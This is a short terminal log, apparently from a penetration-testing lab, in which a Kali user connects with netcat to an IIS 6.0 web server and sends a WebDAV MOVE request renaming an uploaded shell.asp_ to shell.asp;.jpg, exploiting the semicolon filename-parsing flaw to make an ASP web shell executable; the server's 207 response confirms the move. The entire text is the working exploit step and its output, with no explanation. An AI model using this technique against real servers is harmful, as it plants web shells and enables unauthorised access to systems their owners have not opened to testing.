
```
root@kali:~/hacking/10.11.1.229# nc -nv 10.11.1.229 80
(UNKNOWN) [10.11.1.229] 80 (http) open
MOVE /shell.asp_ HTTP/1.1
HOST: 10.11.1.229
DESTINATION: /shell.asp;.jpg
```

```
HTTP/1.1 207 Multi-Status
Date: Tue, 05 Dec 2017 16:36:59 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Location: http://10.11.1.229/shell.asp;.jpg
Content-Type: text/xml
```
